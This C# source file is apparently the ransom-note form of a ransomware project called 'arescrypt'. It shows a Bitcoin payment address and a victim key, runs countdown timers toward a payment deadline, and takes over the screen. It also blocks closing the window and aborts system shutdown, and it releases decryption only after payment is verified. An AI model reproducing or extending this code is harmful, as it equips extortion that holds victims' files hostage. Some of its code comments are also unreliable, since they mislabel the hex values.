﻿using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace arescrypt
{
    public partial class Display : Form
    {

        [DllImport("user32.dll")]
        static extern void mouse_event(uint dwflag);
        static Configuration config = new Configuration();
        static UserData userData = new UserData();
        static AccountManager accountManager = new AccountManager();

        public Display() {
            InitializeComponent();

            // Make configurations, as required
            if (!config.sandBox) // == false
            {   // This will maximize the screen, and eliminate the taskbar. 
                this.WindowState = FormWindowState.Maximized;
                this.FormBorderStyle = FormBorderStyle.None;
            }

            this.cryptoAddress.Text = config.cryptoAddress;
            this.uniqueKeyDisplay.Text = userData.getUniqueKey();
            this.amountChargeNotice.Text = "Send $" + Configuration.amountToCharge + " worth of Bitcoin to this address:";
        }        
        
        private void lostTimer_Tick(object sender, EventArgs e)
        {
            string lostTimer_Hours_Text = config.lostTimer_Hours.ToString();
            string lostTimer_Minutes_Text = config.lostTimer_Minutes.ToString();
            string lostTimer_Seconds_Text = config.lostTimer_Seconds.ToString();

            if (config.lostTimer_Minutes == 0x0 && config.lostTimer_Seconds == 0x0)
            {
                config.lostTimer_Hours--; // Decrement 'Hours' variable
                config.lostTimer_Minutes = 0x3B; // 60
                config.lostTimer_Seconds = 0x3C;
            }
            else if (config.lostTimer_Seconds == 0x0)
            {
                config.lostTimer_Minutes--;
                config.lostTimer_Seconds = 0x3B;
            }

            config.lostTimer_Seconds--;
            if (lostTimer_Hours_Text.Length == 1)
                lostTimer_Hours_Text = 0x0.ToString() + lostTimer_Hours_Text;
            if (lostTimer_Minutes_Text.Length == 1)
                lostTimer_Minutes_Text = 0x0.ToString() + lostTimer_Minutes_Text;
            if (lostTimer_Seconds_Text.Length == 1)
                lostTimer_Seconds_Text = 0x0.ToString() + lostTimer_Seconds_Text;

            paymentTimer_Lost.Text = lostTimer_Hours_Text + ":" + lostTimer_Minutes_Text + ":" + lostTimer_Seconds_Text;
        }
        
        private void riseTimer_Tick(object sender, EventArgs e)
        {
            string riseTimer_Hours_Text = config.riseTimer_Hours.ToString();
            string riseTimer_Minutes_Text = config.riseTimer_Minutes.ToString();
            string riseTimer_Seconds_Text = config.riseTimer_Seconds.ToString();

            if (config.riseTimer_Minutes == 0x0 && config.riseTimer_Seconds == 0x0)
            {
                config.riseTimer_Hours--; // Decrement 'Hours' variable
                config.riseTimer_Minutes = 0x3B; // 60
                config.riseTimer_Seconds = 0x3C; // 59
            } else if (config.riseTimer_Seconds == 0x0)
            {
                config.riseTimer_Minutes--;
                config.riseTimer_Seconds = 60;
            }

            config.riseTimer_Seconds--;

            if (riseTimer_Hours_Text.Length == 1)
                riseTimer_Hours_Text = 0x0.ToString() + riseTimer_Hours_Text;
            if (riseTimer_Minutes_Text.Length == 1)
                riseTimer_Minutes_Text = 0x0.ToString() + riseTimer_Minutes_Text;
            if (riseTimer_Seconds_Text.Length == 1)
                riseTimer_Seconds_Text = 0x0.ToString() + riseTimer_Seconds_Text;
            
            paymentTimer_Rise.Text = riseTimer_Hours_Text + ":" + riseTimer_Minutes_Text + ":" + riseTimer_Seconds_Text;
        }

        private void preventClose(object sender, FormClosingEventArgs e)
        {
            if (config.debugMode)
            {
                e.Cancel = true;
                if (e.CloseReason == CloseReason.WindowsShutDown)
                    Process.Start("shutdown", "-a");
            }
        }

        private void aboutBitcoin_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        { MessageBox.Show("Learn more about Bitcoin at [https://bitcoin.org/]"); }

        private void aboutBuyingBitcoin_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        { MessageBox.Show("Learn more about Litecoin at [https://litecoin.com/]"); }

        private void contactButton_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        { ContactForm cm = new ContactForm(); cm.Show(); }

        private void checkpaymentBtn_Click(object sender, EventArgs e)
        {
            bool verifiedAccount = accountManager.CheckVerification();
            
            if (verifiedAccount)
            {
                MessageBox.Show("Account has been verified.\nYou may now decrypt your files.");
                accountManager.GetCryptoKeys();
            }
            else
                MessageBox.Show("Account has not been verified.");
        }

        private void decryptBtn_Click(object sender, EventArgs e)
        {
            UserData CryptoKeys = accountManager.GetCryptoKeys();

            if (CryptoKeys.encKey != null && CryptoKeys.encKey != "")
            {
                var confirm = MessageBox.Show("Would you like to launch decryption?", "Encryption Keys have been recieved.", MessageBoxButtons.YesNo);
                if (confirm == DialogResult.Yes)
                {
                    Queue que = new Queue();
                    que.DecryptAllFiles();

                    // waiting for decryption to complete...

                    MessageBox.Show("Decryption complete!");
                }
            }
            else
            {
                MessageBox.Show("Account has not been verified.");
            }
        }

        private void copyBtn_Click(object sender, EventArgs e)
        { cryptoAddress.Select(); Clipboard.SetText(cryptoAddress.Text); }
    }
}
